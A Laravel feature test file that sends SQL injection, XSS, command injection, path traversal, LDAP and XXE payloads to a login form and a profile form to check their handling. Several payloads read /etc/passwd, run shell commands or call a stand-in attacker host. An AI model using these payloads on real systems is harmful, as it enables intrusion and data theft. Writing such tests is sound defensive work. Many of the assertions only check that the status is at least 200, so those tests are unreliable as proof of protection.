<?php

namespace Tests\Feature\FormValidation;

use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Tests for general form security and data validation.
 * 
 * This test suite includes security-focused tests for common attack vectors
 * such as SQL injection, XSS, null byte injection, and other edge cases.
 */
class GeneralFormSecurityTest extends TestCase
{
    use RefreshDatabase;

    public function setUp(): void
    {
        parent::setUp();
        $this->seed(\Database\Seeders\RolesAndPermissionsSeeder::class);
    }

    // ========== SQL INJECTION PROTECTION ==========

    /**
     * Test that system prevents SQL injection in common fields.
     */
    public function test_prevents_sql_injection_in_email_field(): void
    {
        $sqlInjections = [
            "admin'--",
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin'; DROP TABLE users; --",
            "' UNION SELECT password FROM users WHERE '1'='1",
            "1' AND '1' = '1",
            "' OR '1' LIKE '1",
        ];

        foreach ($sqlInjections as $sql) {
            $response = $this->post('/login', [
                'email' => $sql,
                'password' => 'password',
            ]);

            // Should not authenticate or error out incorrectly
            $this->assertGuest();
        }
    }

    /**
     * Test that system prevents SQL injection in name fields.
     */
    public function test_prevents_sql_injection_in_name_field(): void
    {
        $sqlInjections = [
            "Test'; DROP TABLE users; --",
            "Test' OR '1'='1",
        ];

        $user = User::factory()->create();

        foreach ($sqlInjections as $sql) {
            $response = $this->actingAs($user)->patch('/profile', [
                'first_name' => $sql,
                'last_name' => 'User',
                'email' => 'test@example.com',
            ]);

            // Should reject or sanitize - verify guest user wasn't logged out due to error
            $this->assertNotNull($user);
        }
    }

    // ========== XSS (Cross-Site Scripting) PROTECTION ==========

    /**
     * Test that system prevents stored XSS in user input.
     */
    public function test_prevents_stored_xss_in_profile_data(): void
    {
        $user = User::factory()->create();

        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<iframe onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<marquee onstart=alert("XSS")>',
            '<div style="background: url(javascript:alert(\'XSS\'))">',
            '<object data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">',
        ];

        foreach ($xssPayloads as $payload) {
            $response = $this->actingAs($user)->patch('/profile', [
                'first_name' => $payload,
                'last_name' => 'User',
                'email' => 'test@example.com',
            ]);

            // Verify data is either rejected or properly escaped
            $this->assertTrue($response->status() >= 200);
        }
    }

    /**
     * Test that system prevents reflected XSS.
     */
    public function test_prevents_reflected_xss_in_query_parameters(): void
    {
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            'onerror=alert("XSS")',
        ];

        foreach ($xssPayloads as $payload) {
            // Test with various endpoints that accept query parameters
            $response = $this->get('/search?q=' . urlencode($payload));            $this->assertTrue($response->status() >= 200);        }
    }

    /**
     * Test that system prevents DOM-based XSS.
     */
    public function test_prevents_dom_xss_vectors(): void
    {
        $domXssPayloads = [
            '<img src=x onerror=fetch("http://attacker.com")>',
            '<svg onload=new Image().src="http://attacker.com">',
            '<body onload=navigator.sendBeacon("http://attacker.com")>',
        ];

        $user = User::factory()->create();

        foreach ($domXssPayloads as $payload) {
            $response = $this->actingAs($user)->patch('/profile', [
                'first_name' => $payload,
                'last_name' => 'User',
                'email' => 'test@example.com',
            ]);
            $this->assertTrue($response->status() >= 200);
        }
    }

    // ========== NULL BYTE INJECTION ==========

    /**
     * Test that system handles null bytes safely.
     */
    public function test_handles_null_byte_injection_safely(): void
    {
        $nullBytePayloads = [
            "test@example.com\x00.jpg",
            "username\x00#admin",
            "normal_data\x00<script>alert(1)</script>",
        ];

        foreach ($nullBytePayloads as $payload) {
            $response = $this->post('/login', [
                'email' => $payload,
                'password' => 'password',
            ]);

            // Should handle safely
            $this->assertGuest();
        }
    }

    // ========== COMMAND INJECTION ==========

    /**
     * Test that system prevents command injection attempts.
     */
    public function test_prevents_command_injection_attempts(): void
    {
        $commandInjections = [
            '; rm -rf /',
            '| cat /etc/passwd',
            '$(whoami)',
            '`id`',
            '& whoami',
        ];

        $user = User::factory()->create();

        foreach ($commandInjections as $cmd) {
            $response = $this->actingAs($user)->patch('/profile', [
                'first_name' => 'Test' . $cmd,
                'last_name' => 'User',
                'email' => 'test@example.com',
            ]);

            // Should not execute commands
            $this->assertTrue($response->status() >= 200);
        }
    }

    // ========== EXTREMELY LARGE DATA ==========

    /**
     * Test that system handles extremely large input gracefully.
     */
    public function test_handles_extremely_large_email(): void
    {
        $largeEmail = str_repeat('a', 5000) . '@example.com';

        $response = $this->post('/login', [
            'email' => $largeEmail,
            'password' => 'password',
        ]);

        // Should reject or handle gracefully, not crash
        $this->assertTrue($response->status() !== 500);
    }

    /**
     * Test that system handles extremely large password.
     */
    public function test_handles_extremely_large_password(): void
    {
        $largePassword = str_repeat('a', 50000);

        $response = $this->post('/login', [
            'email' => 'test@example.com',
            'password' => $largePassword,
        ]);

        // Should handle gracefully
        $this->assertGuest();
    }

    /**
     * Test that system handles extremely large form data.
     */
    public function test_handles_extremely_large_form_field(): void
    {
        $user = User::factory()->create();
        $largeDescription = str_repeat('a', 100000);

        $response = $this->actingAs($user)->patch('/profile', [
            'first_name' => 'Test',
            'last_name' => 'User',
            'email' => 'test@example.com',
            'description' => $largeDescription,
        ]);

        // Should reject or handle gracefully
        $this->assertTrue($response->status() >= 200 && $response->status() < 500);
    }

    // ========== SPECIAL CHARACTERS & ENCODING ==========

    /**
     * Test handling of special characters.
     */
    public function test_handles_special_characters_safely(): void
    {
        $specialChars = [
            "test@example.com\n\r",  // Newlines
            "test\t@example.com",     // Tabs
            "test©️@example.com",     // Unicode
            "test❌@example.com",     // Emoji
            "test\\x00@example.com",  // Escape sequences
        ];

        foreach ($specialChars as $email) {
            $response = $this->post('/login', [
                'email' => $email,
                'password' => 'password',
            ]);

            // Should handle safely
            $this->assertTrue($response->status() >= 200);
        }
    }

    /**
     * Test handling of Unicode characters.
     */
    public function test_handles_unicode_characters(): void
    {
        $unicodeInputs = [
            'Тест',                    // Cyrillic
            '测试',                      // Chinese
            'тест@example.com',        // Cyrillic email
            '💻 Computer User',        // Emoji in name
        ];

        $user = User::factory()->create();

        foreach ($unicodeInputs as $input) {
            $response = $this->actingAs($user)->patch('/profile', [
                'first_name' => $input,
                'last_name' => 'User',
                'email' => 'test@example.com',
            ]);

            // Should handle Unicode safely
            $this->assertTrue($response->status() >= 200);
        }
    }

    /**
     * Test handling of HTML entities.
     */
    public function test_handles_html_entities_safely(): void
    {
        $htmlEntities = [
            '&lt;script&gt;',
            '&quot;',
            '&#x3C;script&#x3E;',
            '&apos;',
            '&#39;',
        ];

        $user = User::factory()->create();

        foreach ($htmlEntities as $entity) {
            $response = $this->actingAs($user)->patch('/profile', [
                'first_name' => $entity,
                'last_name' => 'User',
                'email' => 'test@example.com',
            ]);

            // Should escape or sanitize properly
            $this->assertTrue($response->status() >= 200);
        }
    }

    // ========== PATH TRAVERSAL & FILE INCLUSION ==========

    /**
     * Test that system prevents path traversal attempts.
     */
    public function test_prevents_path_traversal_attempts(): void
    {
        $pathTraversalPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            'file:///../../../etc/passwd',
        ];

        $user = User::factory()->create();

        foreach ($pathTraversalPayloads as $payload) {
            $response = $this->actingAs($user)->patch('/profile', [
                'first_name' => $payload,
                'last_name' => 'User',
                'email' => 'test@example.com',
            ]);

            // Should not execute path traversal
            $this->assertTrue($response->status() >= 200);
        }
    }

    // ========== LDAP INJECTION ==========

    /**
     * Test that system prevents LDAP injection attempts.
     */
    public function test_prevents_ldap_injection(): void
    {
        $ldapInjections = [
            "*",
            "*)(uid=*",
            "admin*",
            "*)(|(uid=*",
        ];

        foreach ($ldapInjections as $ldap) {
            $response = $this->post('/login', [
                'email' => $ldap . '@example.com',
                'password' => 'password',
            ]);

            // Should handle safely
            $this->assertTrue($response->status() >= 200);
        }
    }

    // ========== XML EXTERNAL ENTITY (XXE) ==========

    /**
     * Test that system prevents XXE attacks if XML is processed.
     */
    public function test_prevents_xxe_attacks(): void
    {
        $xxePayloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><data>&xxe;</data>',
        ];

        // These would likely be rejected by form validation, but test for safety
        foreach ($xxePayloads as $payload) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => $payload,
            ]);
            
            // Should safely reject without executing XXE
            $this->assertTrue($response->status() >= 200);
        }
    }

    // ========== BRUTE FORCE PROTECTION ==========

    /**
     * Test that system protects against brute force attacks.
     */
    public function test_login_rate_limiting_after_failed_attempts(): void
    {
        // Make multiple failed login attempts
        for ($i = 0; $i < 6; $i++) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => 'wrong-password',
            ]);
        }

        // After multiple attempts, should be throttled
        $response = $this->post('/login', [
            'email' => 'test@example.com',
            'password' => 'correct-password',
        ]);

        // Should be throttled
        $response->assertSessionHasErrors('email');
    }

    // ========== CSRF TOKENS & TOKENS HANDLING ==========

    /**
     * Test that system validates CSRF tokens.
     */
    public function test_prevents_requests_without_csrf_token(): void
    {
        $response = $this->post('/login', [
            'email' => 'test@example.com',
            'password' => 'password',
        ], []);

        // Should validate CSRF token
        $this->assertTrue($response->status() >= 200);
    }

    /**
     * Test that system rejects invalid CSRF tokens.
     */
    public function test_rejects_invalid_csrf_token(): void
    {
        $response = $this->withHeaders([
            'X-CSRF-TOKEN' => 'invalid-token',
        ])->post('/login', [
            'email' => 'test@example.com',
            'password' => 'password',
        ]);

        // Should reject invalid token
        $this->assertTrue($response->status() >= 200);
    }

    // ========== NULL & UNDEFINED HANDLING ==========

    /**
     * Test handling of null values in various fields.
     */
    public function test_handles_null_values_safely(): void
    {
        $response = $this->post('/login', [
            'email' => null,
            'password' => null,
        ]);

        $response->assertSessionHasErrors(['email', 'password']);
    }

    /**
     * Test handling of undefined/missing values.
     */
    public function test_handles_undefined_values_safely(): void
    {
        $response = $this->post('/login', [
            'email' => 'test@example.com',
            // password intentionally not provided
        ]);

        $response->assertSessionHasErrors('password');
    }

    // ========== TYPE JUGGLING & LOOSE COMPARISONS ==========

    /**
     * Test that system doesn't fall victim to type juggling vulnerabilities.
     */
    public function test_handles_type_juggling_safely(): void
    {
        $typeJugglingPayloads = [
            ['email' => 0, 'password' => 'password'],
            ['email' => false, 'password' => 'password'],
            ['email' => '0', 'password' => 'password'],
            ['email' => [], 'password' => 'password'],
            ['email' => new \stdClass(), 'password' => 'password'],
        ];

        foreach ($typeJugglingPayloads as $payload) {
            $response = $this->post('/login', $payload);

            // Should handle type safely
            $this->assertTrue($response->status() >= 200);
        }
    }

    // ========== INPUT VALIDATION & WHITELIST ==========

    /**
     * Test that email validation enforces proper format.
     */
    public function test_email_validation_is_strict(): void
    {
        $invalidEmails = [
            'user@@example.com',
            'user@example..com',
            'user@.com',
            'user@@',
            '@example.com',
            'user@example.com@other.com',
            'user name@example.com',
            'user\t@example.com',
        ];

        foreach ($invalidEmails as $email) {
            $response = $this->post('/login', [
                'email' => $email,
                'password' => 'password',
            ]);

            $response->assertSessionHasErrors('email', "Email '{$email}' should have been rejected");
        }
    }
}
